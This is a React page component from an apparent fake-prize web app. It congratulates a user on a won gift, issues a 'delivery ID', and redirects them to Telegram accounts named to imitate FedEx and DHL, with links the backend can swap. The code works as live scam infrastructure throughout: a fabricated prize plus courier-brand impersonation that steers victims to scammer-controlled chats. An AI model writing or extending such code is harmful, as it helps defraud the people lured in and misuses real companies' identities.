import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useGame } from '../../context/GameContext';
import { generateDeliveryId, fetchSettings } from '../../services/api';
import { CopyToClipboard } from 'react-copy-to-clipboard';
import './BringPackagePage.css';

const FALLBACK_LINK1 = 'https://t.me/fedexlogisticzdelivery';
const FALLBACK_LINK2 = 'https://t.me/DHLlogisticzdelivery';

const BringPackagePage = () => {
  const navigate = useNavigate();
  const {
    gameId,
    userDetails,
    wonGift,
    deliveryId,
    setDeliveryId,
    updateProgress,
    step,
    loading,
  } = useGame();
  const [copied, setCopied] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [links, setLinks] = useState({
    deliveryLink1: FALLBACK_LINK1,
    deliveryLink2: FALLBACK_LINK2,
  });

  // Restore / redirect
  useEffect(() => {
    if (loading) return;
    if (!gameId || !userDetails || !wonGift) {
      navigate('/');
      return;
    }
    if (step < 2) {
      navigate(step === 1 ? '/spin' : '/');
      return;
    }
    if (!deliveryId && step < 3) {
      const genDelivery = async () => {
        try {
          const res = await generateDeliveryId(gameId);
          const did = res.data.deliveryId;
          setDeliveryId(did);
          updateProgress(3, { deliveryId: did });
        } catch (err) {
          alert('Failed to generate delivery ID');
        }
      };
      genDelivery();
    }

    // Fetch custom links from backend
    const getLinks = async () => {
      try {
        const res = await fetchSettings();
        const data = res.data;
        setLinks({
          deliveryLink1: data.deliveryLink1 || FALLBACK_LINK1,
          deliveryLink2: data.deliveryLink2 || FALLBACK_LINK2,
        });
        console.log('Delivery links loaded:', data);
      } catch (err) {
        console.warn('Failed to fetch delivery links, using defaults');
      }
    };
    getLinks();
  }, [
    loading,
    gameId,
    userDetails,
    wonGift,
    deliveryId,
    step,
    navigate,
    setDeliveryId,
    updateProgress,
  ]);

  const handleContinueClick = () => {
    setShowPopup(true);
  };

  const handleDelivery1 = () => {
    console.log('Opening Delivery 1:', links.deliveryLink1);
    window.location.href = links.deliveryLink1;
  };

  const handleDelivery2 = () => {
    console.log('Opening Delivery 2:', links.deliveryLink2);
    window.location.href = links.deliveryLink2;
  };

  if (loading) return <div className="loading">Loading...</div>;
  if (!gameId || !userDetails || !wonGift) return null;

  return (
    <div className="bringpackage-page">
      <section className="congrats">
        <h2>Congratulations, {userDetails.name}!</h2>
      </section>

      <section className="delivery-id-section">
        <p>Your Delivery ID:</p>
        <h3>{deliveryId || 'Generating...'}</h3>
        {deliveryId && (
          <CopyToClipboard text={deliveryId} onCopy={() => setCopied(true)}>
            <button>{copied ? 'Copied!' : 'Copy'}</button>
          </CopyToClipboard>
        )}
      </section>

      <section className="warning">
        <p>⚠️ Copy or write down the delivery ID and keep it safe. It cannot be recovered if lost.</p>
      </section>

      <section className="instruction">
        <p>
          Click the button below to send your delivery ID to our delivery system on Telegram.
          The delivery will start bringing your prize immediately.
        </p>
      </section>

      <section className="action">
        <button className="continue-btn" onClick={handleContinueClick} disabled={!deliveryId}>
          Continue to Delivery System
        </button>
      </section>

      {showPopup && (
        <div className="popup-overlay">
          <div className="popup-content">
            <h3>Choose your delivery service</h3>
            <div className="delivery-buttons">
              <button className="delivery1-btn" onClick={handleDelivery1}>
                Delivery 1
              </button>
              <button className="delivery2-btn" onClick={handleDelivery2}>
                Delivery 2
              </button>
            </div>
            <button className="cancel-popup" onClick={() => setShowPopup(false)}>
              Cancel
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default BringPackagePage;